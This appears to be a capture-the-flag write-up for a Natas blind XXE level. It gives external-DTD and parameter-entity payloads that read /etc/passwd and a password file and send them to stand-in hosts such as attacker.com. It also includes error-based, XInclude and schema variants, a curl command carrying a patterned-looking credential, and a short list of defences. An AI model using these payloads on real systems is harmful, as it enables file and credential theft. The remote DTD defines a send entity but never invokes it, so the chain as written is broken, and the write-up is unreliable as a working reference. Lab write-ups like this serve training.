// XXE — DTD-Based — External DTD Injection

✦ Crafted by Leo · GitHub | LinkedIn | Telegram
34 XXE — DTD-Based — External DTD Injection Hard
// Key Concepts
XXE (XML External Entity) External DTD Injection Parameter Entities Out-of-Band Data Exfiltration Blind XXE
// Challenge Overview

This level presents a blind XXE vulnerability where the application doesn't display the output of the XML parser. We need to use out-of-band (OOB) data exfiltration or error-based techniques to extract data from the server.

// Initial Analysis

Check the source code to understand the vulnerability:

<?php $xml = file_get_contents("php://input"); $dom = new DOMDocument(); $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); print "XML processed successfully."; ?>

The application doesn't output any data from the XML parsing, making it a blind XXE vulnerability. However, we can still extract data using:

  • Out-of-Band (OOB) exfiltration: Send data to an external server
  • Error-based XXE: Trigger errors that reveal data
  • Parameter entities: Use DTD-based exfiltration
💡 Blind XXE attacks use out-of-band techniques to exfiltrate data. By hosting a malicious DTD on a server you control, you can receive the data through HTTP requests.
// Blind XXE Techniques
# OOB Exfiltration with Parameter Entities <!DOCTYPE root [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd"> %dtd; ]> # Remote DTD file (malicious.dtd) <!ENTITY % payload " <!ENTITY % send SYSTEM 'http://attacker.com/?data=%file;'> "> %payload; # Error-based XXE <!DOCTYPE root [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval " <!ENTITY % error SYSTEM 'file:///nonexistent/%file;'> "> %eval; %error; ]>
// Solution Steps

Step 1 — Host a malicious DTD on your server:

Create a file called malicious.dtd on your server:

<!ENTITY % payload " <!ENTITY % send SYSTEM 'http://YOUR-SERVER:PORT/?data=%file;'> "> %payload;

Step 2 — Send the XXE payload:

<!DOCTYPE root [ <!ENTITY % file SYSTEM "file:///etc/natas_webpass/natas35"> <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/malicious.dtd"> %dtd; ]> <root></root>

Step 3 — Receive the data on your server:

Set up a simple HTTP server to receive the exfiltrated data:

python3 -m http.server 8080

Alternative — Error-based XXE (no external server needed):

<!DOCTYPE root [ <!ENTITY % file SYSTEM "file:///etc/natas_webpass/natas35"> <!ENTITY % eval " <!ENTITY % error SYSTEM 'file:///nonexistent/%file;'> "> %eval; %error; ]> <root></root>

Using curl (with OOB):

curl -u natas34:z5p9s8Mq3W9qN5qP8qV5qV8qV5qV8q \ -X POST \ -H "Content-Type: application/xml" \ --data '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/natas_webpass/natas35"><!ENTITY % dtd SYSTEM "http://YOUR-SERVER/malicious.dtd">%dtd;]><root></root>' \ http://natas34.natas.labs.overthewire.org/
// Why It Works

The blind XXE vulnerability works because:

  • External entities are enabled: The LIBXML_NOENT flag allows external entities.
  • Parameter entities are supported: Parameter entities can be used to build complex payloads.
  • Out-of-band data exfiltration: The server can send data to external URLs.
  • Error messages reveal data: Error-based XXE can exfiltrate data through error messages.
// Blind XXE Techniques
# Technique 1: OOB Exfiltration # Requires a server you control to receive the data # Technique 2: Error-Based XXE # Uses error messages to leak data # Technique 3: XInclude <root xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include href="file:///etc/passwd" parse="text"/> </root> # Technique 4: Schema-based XXE <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://attacker.com/schema.xsd">
// Defense Measures
  • Disable external entities: Use LIBXML_NONET and disable DTD loading.
  • Disable parameter entities: Configure the XML parser to disable parameter entities.
  • Use a secure parser: Use a parser that disables external entities by default.
  • Validate input: Validate and sanitize XML input.
  • Use JSON instead: JSON doesn't have the same entity expansion vulnerabilities.

// Key Takeaways
🔍 Blind XXE Is Still Exploitable

Even when an application doesn't display XML output, attackers can still extract data using OOB or error-based techniques.

🛡️ Disable External Entities

The only reliable defense against XXE is to disable external entity processing entirely. Use LIBXML_NONET and disable DTD loading.
